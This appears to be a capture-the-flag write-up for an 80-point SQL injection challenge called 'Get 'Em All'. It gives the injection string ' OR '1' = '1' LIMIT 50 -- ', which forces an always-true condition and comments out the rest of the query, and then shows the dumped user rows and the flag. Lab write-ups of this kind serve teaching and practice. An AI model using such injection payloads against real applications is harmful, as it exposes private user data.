# Get 'Em All - 80 Solution
---

We check the source, and see that it tells us to try entering random names and seeing what happens.

We see that if the user exists it returns to us a name and his/her corresponding data. So if we can fool the server into thinking a user exists or as far as SQL is concerned that a condition is true, we can get a list of all the users and their corresponding data.

I entered: `' OR '1' = '1' LIMIT 50 -- '`

Which will always evaluate to true and wanted to get the top 50 entries as well as comment out any exploitation preventative code. This worked and I got back:

    Name: Luke
    Data: I made this problem.
    Name: Alec
    Data: Steam boys.
    Name: Jalen
    Data: Pump that iron fool.
    Name: Eric
    Data: I make cars.
    Name: Sam
    Data: Thinks he knows SQL.
    Name: fl4g__giv3r
    Data: ABCTF{th4t_is_why_you_n33d_to_sanitiz3_inputs}
    Name: snoutpop
    Data: jowls
    Name: Chunbucket
    Data: @datboiiii

Flag: **ABCTF{th4t_is_why_you_n33d_to_sanitiz3_inputs}**
